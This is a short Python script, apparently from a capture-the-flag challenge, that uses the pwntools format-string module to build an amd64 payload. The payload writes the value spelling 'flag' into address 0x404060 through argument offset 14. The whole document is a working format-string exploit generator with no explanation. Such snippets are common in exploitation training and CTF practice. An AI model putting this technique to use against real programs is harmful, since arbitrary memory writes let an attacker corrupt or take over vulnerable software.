from pwnlib.fmtstr import *

context.arch='amd64'
print(fmtstr_payload(14, {0x404060:0x67616c66}, numbwritten=0, write_size='byte').decode('utf-8'))
